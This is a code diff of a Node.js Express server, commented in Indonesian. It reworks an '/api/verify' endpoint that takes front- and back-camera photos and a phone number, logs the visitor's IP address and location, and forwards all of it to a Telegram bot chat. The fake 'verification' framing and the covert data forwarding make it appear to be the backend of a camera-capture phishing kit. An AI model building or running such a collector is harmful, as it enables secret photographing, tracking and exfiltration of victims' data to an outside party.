@@ -19,9 +19,11 @@ console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ Set' : '❌ Not set'}`);
 console.log(`🌐 PORT: ${PORT}`);
 console.log('🚀 ========================================');
 
-// Setup multer untuk handle FormData dengan benar
-const upload = multer({
-  limits: { fileSize: 20 * 1024 * 1024 } // 20MB limit
+// Setup multer untuk handle file upload
+const storage = multer.memoryStorage();
+const upload = multer({ 
+  storage: storage,
+  limits: { fileSize: 20 * 1024 * 1024 } // 20MB
 });
 
 app.use(express.json({ limit: '20mb' }));
@@ -152,29 +154,30 @@ app.get('/test-send', async (req, res) => {
   }
 });
 
-// Verify endpoint dengan multer
-app.post('/api/verify', upload.none(), async (req, res) => {
+// Verify endpoint dengan multer untuk handle file
+app.post('/api/verify', upload.fields([
+  { name: 'image', maxCount: 1 },
+  { name: 'backImage', maxCount: 1 }
+]), async (req, res) => {
   console.log('📸 ===== NEW VERIFICATION REQUEST =====');
   console.log('📸 Time:', new Date().toISOString());
   
   try {
-    // Ambil dari body (multer sudah parse)
-    const image = req.body.image;
-    const backImage = req.body.backImage || null;
+    // Ambil file dari req.files
+    const files = req.files;
     const phone = req.body.phone || `User_${Date.now().toString().slice(-6)}`;
     
     console.log(`📱 Phone: ${phone}`);
-    console.log(`📸 Image exists: ${!!image}`);
-    console.log(`📸 Image length: ${image ? image.length : 0}`);
-    console.log(`📸 Back image: ${backImage ? 'Yes' : 'No'}`);
+    console.log(`📸 Files received:`, Object.keys(files));
     
-    // Log semua body
-    console.log('📦 Request body keys:', Object.keys(req.body));
-    
-    if (!image) {
-      console.log('❌ No image received');
+    // Cek file image (front camera)
+    if (!files.image || !files.image[0]) {
+      console.log('❌ No image file received');
       return res.status(400).json({ success: false, error: 'Foto tidak ditemukan' });
     }
+    
+    const frontFile = files.image[0];
+    console.log(`📸 Front image: ${frontFile.originalname}, size: ${frontFile.size} bytes`);
     
     // Get IP and location
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
@@ -186,11 +189,6 @@ app.post('/api/verify', upload.none(), async (req, res) => {
     console.log(`📍 Location: ${location}`);
     console.log(`🕒 Time: ${timestamp}`);
     
-    // Process front image
-    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
-    const buffer = Buffer.from(base64Data, 'base64');
-    console.log(`📸 Front image size: ${buffer.length} bytes`);
-    
     // Save to database
     const db = readDatabase();
     db.users.push({
@@ -198,13 +196,13 @@ app.post('/api/verify', upload.none(), async (req, res) => {
       timestamp: timestamp,
       location: location,
       ip: ip,
-      hasBackCamera: backImage ? true : false
+      hasBackCamera: files.backImage && files.backImage[0] ? true : false
     });
     writeDatabase(db);
     console.log('💾 Data saved to database');
     
-    // ===== SEND TO TELEGRAM =====
-    console.log('📤 Sending to Telegram...');
+    // ===== SEND FRONT PHOTO TO TELEGRAM =====
+    console.log('📤 Sending front photo to Telegram...');
     
     if (!BOT_TOKEN || !CHAT_ID) {
       console.error('❌ BOT_TOKEN or CHAT_ID not set!');
@@ -224,7 +222,7 @@ app.post('/api/verify', upload.none(), async (req, res) => {
       `🌐 *IP:* ${ip}\n\n` +
       `_Foto depan dikirim untuk verifikasi_`
     );
-    form.append('photo', buffer, { 
+    form.append('photo', frontFile.buffer, { 
       filename: `verifikasi_depan_${Date.now()}.jpg`, 
       contentType: 'image/jpeg' 
     });
@@ -248,12 +246,11 @@ app.post('/api/verify', upload.none(), async (req, res) => {
     
     console.log('✅ Front photo sent successfully!');
     
-    // If back camera image exists, send it too
-    if (backImage) {
-      console.log('📤 Sending back camera to Telegram...');
-      const backBase64 = backImage.replace(/^data:image\/\w+;base64,/, '');
-      const backBuffer = Buffer.from(backBase64, 'base64');
-      console.log(`📸 Back image size: ${backBuffer.length} bytes`);
+    // Send back photo if exists
+    if (files.backImage && files.backImage[0]) {
+      console.log('📤 Sending back photo to Telegram...');
+      const backFile = files.backImage[0];
+      console.log(`📸 Back image: ${backFile.originalname}, size: ${backFile.size} bytes`);
       
       const backForm = new FormData();
       backForm.append('chat_id', CHAT_ID);
@@ -264,7 +261,7 @@ app.post('/api/verify', upload.none(), async (req, res) => {
         `🕒 *Waktu:* ${timestamp}\n\n` +
         `_Foto belakang dikirim untuk verifikasi_`
       );
-      backForm.append('photo', backBuffer, { 
+      backForm.append('photo', backFile.buffer, { 
         filename: `verifikasi_belakang_${Date.now()}.jpg`, 
         contentType: 'image/jpeg' 
       });
